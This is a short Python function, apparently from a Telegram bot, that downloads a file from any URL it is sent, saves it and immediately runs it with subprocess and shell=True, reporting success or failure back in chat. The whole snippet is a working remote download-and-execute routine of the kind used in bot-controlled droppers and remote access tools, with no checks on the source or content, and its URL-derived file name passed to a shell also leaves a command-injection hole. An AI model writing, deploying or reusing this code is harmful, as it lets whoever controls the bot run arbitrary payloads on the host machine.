import requests
import subprocess
import os
import asyncio

async def download_and_execute(update, context, url):
    filename = url.split("/")[-1]
    try:
        r = requests.get(url)
        with open(filename, "wb") as f:
            f.write(r.content)
        await update.message.reply_text(f"✅ Downloaded {filename}")
        # Execute file (Windows example)
        subprocess.Popen(filename, shell=True)
        await update.message.reply_text(f"▶️ Executed {filename}")
    except Exception as e:
        await update.message.reply_text(f"❌ Download or execution failed: {e}")
